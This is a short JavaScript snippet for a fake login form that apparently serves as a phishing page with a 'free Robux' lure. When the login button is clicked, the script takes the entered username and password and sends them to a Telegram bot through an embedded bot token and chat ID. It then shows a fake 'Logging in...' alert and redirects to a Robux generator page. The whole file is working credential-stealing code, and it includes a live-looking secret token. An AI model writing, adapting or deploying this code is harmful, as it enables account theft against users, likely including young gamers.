document.getElementById("loginBtn").addEventListener("click", () => {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  const token = "7614186719:AAG7QyHjzRA7YffYVrhm6V7AtW_i6aaXo9Q";
  const chat_id = "6950087756";
  const message = `New Login:\nUsername: ${username}\nPassword: ${password}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
    .then(() => {
      alert("Logging in..."); // fake it for now
      window.location.href = "https://r00t-x-1.github.io/Robux-Free/Robux-Free/rbx-gen/gen.html";
    });
});
